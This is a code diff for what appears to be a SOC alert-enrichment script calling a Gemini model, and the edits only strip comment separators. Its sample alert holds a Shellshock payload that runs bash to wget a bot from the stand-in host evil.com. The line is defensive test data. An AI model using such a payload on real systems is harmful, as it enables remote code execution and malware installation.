@@ -70,7 +70,6 @@ from dotenv import load_dotenv
 from google import genai
 
 # Load Gemini API key from .env (MANDATORY)
-# --------
 load_dotenv()
 GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
 if not GEMINI_API_KEY:
@@ -82,7 +81,6 @@ if not GEMINI_API_KEY:
     )
 
 # Initialize Gemini client (MANDATORY at module load)
-# --------
 try:
     CLIENT = genai.Client(api_key=GEMINI_API_KEY)
 except Exception as e:
@@ -93,7 +91,6 @@ except Exception as e:
     )
 
 # Get Gemini 3 model (STRICTLY MANDATORY - No fallbacks)
-# --------
 def get_gemini3_model() -> str:
     """
     STRICTLY ENFORCE Gemini 3 model availability.
@@ -158,21 +155,15 @@ def get_gemini3_model() -> str:
 MODEL_ID = get_gemini3_model()
 print(f"[INFO] Using Gemini 3 model: {MODEL_ID}")
 
-# -----------------------------
 # Sample alert to enrich
-# -----------------------------
 test_alert = {
     "source_ip": "41.90.12.77",
     "payload": '() { :;}; /bin/bash -c "wget http://evil.com/bot"',
     "user_agent": "ShellShock-Exploit/1.0"
 }
-
-# =============================
 # Function: enrich SOC alert
-# =============================
 # MANDATE: This function uses Gemini 3 API exclusively.
 # No other enrichment method, model, or fallback is permitted.
-# =============================
 def enrich_alert(alert: dict) -> dict:
     """Enrich SOC alert using GEMINI 3 API ONLY (no fallbacks).
     
@@ -306,9 +297,7 @@ intent, mitre_technique, severity, reasoning, recommended_action"""
     raise Exception(f"Failed to get valid JSON from {MODEL_ID} after 5 retries")
 
 
-# -----------------------------
 # Main execution
-# -----------------------------
 if __name__ == "__main__":
     enriched_json = enrich_alert(test_alert)
     print("\nEnriched Alert:")
